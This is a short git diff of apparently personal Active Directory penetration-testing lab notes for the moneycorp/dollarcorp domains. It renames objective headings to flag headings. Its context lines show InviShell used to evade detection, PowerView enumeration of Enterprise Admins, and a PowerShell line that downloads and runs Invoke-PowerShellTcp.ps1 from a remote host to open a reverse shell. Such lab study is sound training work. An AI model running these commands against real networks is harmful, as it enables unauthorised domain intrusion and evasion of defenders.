@@ -2,7 +2,7 @@ Start by running Invishell to avoid being detected
 ```powershell
 C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
 ```
-### **Learning Objective 1 - SID of the member of the Enterprise Admins group**
+### **FLAG 1 - SID of the member of the Enterprise Admins group**
 
 Import powerView script
 ```powershell
@@ -18,7 +18,7 @@ Get-DomainGroupMember -Identity "Enterprise Admins" -Domain moneycorp.local
 ```
 ![[Pasted image 20231018115633.png]]
 
-### **Learning Objective 2 - Display name of the GPO applied on StudentMachines OU**
+### **FLAG 2 - Display name of the GPO applied on StudentMachines OU**
 Task
 Enumerate following for the dollarcorp domain:
 - List all the OUs
@@ -166,4 +166,4 @@ powershell.exe iex (iwr http://172.16.99.115/Invoke-PowerShellTcp.ps1 -UseBasicP
 
 ### **FLAG 9 - Collection method in BloodHound that covers all the collection methods**
 Launch sharpound on the student vm and export it to kali to use bloodhound
-### **FLAG 10/11/12**
+### **FLAG 10/11/12/13/14/15 - **
